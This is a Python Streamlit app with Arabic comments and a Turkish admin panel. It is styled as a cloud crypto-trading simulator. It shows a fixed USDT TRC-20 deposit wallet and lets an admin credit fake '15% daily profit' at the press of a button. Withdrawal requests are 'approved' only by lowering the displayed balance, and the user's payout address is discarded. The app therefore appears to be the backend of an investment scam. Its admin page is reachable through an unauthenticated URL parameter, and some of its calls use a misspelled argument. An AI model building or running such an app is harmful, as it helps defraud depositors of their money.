import streamlit as st
import json
import os

# 1. إعدادات المنصة العالمية والذاكرة السحابية الذكية لمنع التجمد
st.set_page_config(page_title="Cloud Platform App", page_icon="☁️", layout="centered")

# دالة لتشغيل وتثبيت قاعدة البيانات التلقائية المشتركة بين الواجهتين
if "db_users" not in st.session_state:
    st.session_state.db_users = {}
if "db_requests" not in st.session_state:
    st.session_state.db_requests = []

# قراءة المسار البرمجي السري لمعرفة الزائر (مشرف أم مستخدم)
query_params = st.query_params

# 👑 ==================== [ واجهة لوحة التحكم للمشرف ] ====================
if "page" in query_params and query_params["page"] == "admin":
    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>👑 Bulut Platformu - Yönetim Kontrol Paneli</h2>", unsafe_allowed_html=True)
    
    st.metric(label="Kayıtlı Aktif Üye Sayısı Toplamı 👥", value=len(st.session_state.db_users))
    
    if st.button("📊 Doğrudan Günlük Kar Dağıtımı (%15) ⚡", key="dist_btn"):
        for username in st.session_state.db_users:
            u = st.session_state.db_users[username]
            if u["balance"] > 0:
                p = u["balance"] * 0.15
                u["todayProfit"] += p
                u["balance"] += p
        st.success("📊 %15 Dağıtıldı!")
        st.rerun()

    st.subheader("⚠️ Üyelerin Bekleyen Finansal Talepleri")
    if len(st.session_state.db_requests) == 0:
        st.info("Bekleyen finansal bakiye talebi bulunmamaktadır...")
    else:
        for idx, r in enumerate(st.session_state.db_requests):
            type_text = "📥 Para Yatırma" if r["type"] == "deposit" else "💸 Para Çekme"
            col1, col2, col3, col4 = st.columns([2, 2, 2, 2])
            col1.write(f"👤 {r['username']}")
            col2.write(f"{type_text}")
            col3.write(f"USDT {r['amount']}")
            if col4.button("✅ Onayla", key=f"app_{idx}"):
                username = r["username"]
                if username in st.session_state.db_users:
                    amt = float(r["amount"])
                    if r["type"] == "deposit":
                        st.session_state.db_users[username]["balance"] += amt
                    elif r["type"] == "withdraw_daily":
                        st.session_state.db_users[username]["todayProfit"] -= amt
                st.session_state.db_requests.pop(idx)
                st.success("Talep Onaylandı!")
                st.rerun()

    st.subheader("📊 Üyelerin Bakiyelerinin Canlı Takibi")
    if len(st.session_state.db_users) == 0:
        st.write("Henüz aktif üye yok...")
    else:
        for username, u in st.session_state.db_users.items():
            st.markdown(f"👤 **{username}** | Sermaye: <span style='color:#a855f7;'>USDT {u['balance']:.2f}</span> | Kar: <span style='color:#eab308;'>USDT {u['todayProfit']:.2f}</span>", unsafe_allowed_html=True)

# 👤 ==================== [ واجهة تداول المستخدمين العالمية ] ====================
else:
    st.markdown("<h3 style='text-align: center; color: #38bdf8;'>☁️ منظومة محاكي التداول الذكي والتحليل السحابي</h3>", unsafe_allowed_html=True)
    
    # حظ وقفل الاسم
    user_input = st.text_input("👤 اكتب اسمك هنا لبدء البث حياً:", key="user_in")
    if st.button("💾 إرسال طلب حفظ الاسم للمشرف", key="save_btn"):
        if user_input.strip():
            if user_input.strip() not in st.session_state.db_users:
                st.session_state.db_users[user_input.strip()] = {"username": user_input.strip(), "balance": 0.0, "todayProfit": 0.0}
            st.success(f"💾 تم قفل وحفظ الحساب للمستخدم: {user_input.strip()}")
            st.rerun()
            
    if user_input.strip() in st.session_state.db_users:
        u = st.session_state.db_users[user_input.strip()]
        st.markdown(f"### 👤 المستخدم الحالي: {u['username']}")
        
        col1, col2 = st.columns(2)
        col1.metric("إجمالي رأس المال", f"USDT {u['balance']:.2f}")
        col2.metric("الأرباح اليومية", f"USDT {u['todayProfit']:.2f}")
        
        # بوابة الإيداع والشحن
        st.markdown("---")
        st.markdown("<h5 style='color:#16a34a;'> محفظة الإيداع الرسمية - شبكة USDT (TRC-20)</h5>", unsafe_allowed_html=True)
        st.code("TA1vsgrJEfy3YM6rkQWbppnZemFE6c9pBN", language="")
        dep_amt = st.number_input("أدخل مبلغ الشحن بـ USDT:", min_value=0.0, step=10.0, key="dep_val")
        if st.button("⚡ إرسال طلب الإيداع للمشرف", key="dep_btn"):
            if dep_amt > 0:
                st.session_state.db_requests.append({"username": u['username'], "amount": dep_amt, "type": "deposit"})
                st.success("تم إرسال طلب الشحن بنجاح وينتظر موافقة المشرف!")
                st.rerun()
                
        # بوابة السحب الفوري
        st.markdown("---")
        st.markdown("<h5 style='color:#dc2626;'>🚨 بوابة السحب الفوري المباشر (شبكة TRC-20)</h5>", unsafe_allowed_html=True)
        w_wallet = st.text_input("أدخل عنوان محفظة TRC-20 الخاصة بك:", key="w_wal")
        w_amt = st.number_input("مبلغ سحب أرباح اليوم:", min_value=0.0, step=5.0, key="w_val")
        if st.button("📊 سحب أرباح اليوم", key="w_btn"):
            if w_amt > 0 and w_wallet:
                st.session_state.db_requests.append({"username": u['username'], "amount": w_amt, "type": "withdraw_daily"})
                st.success("تم إرسال طلب السحب بنجاح للمشرف وجاري المراجعة!")
                st.rerun()
        
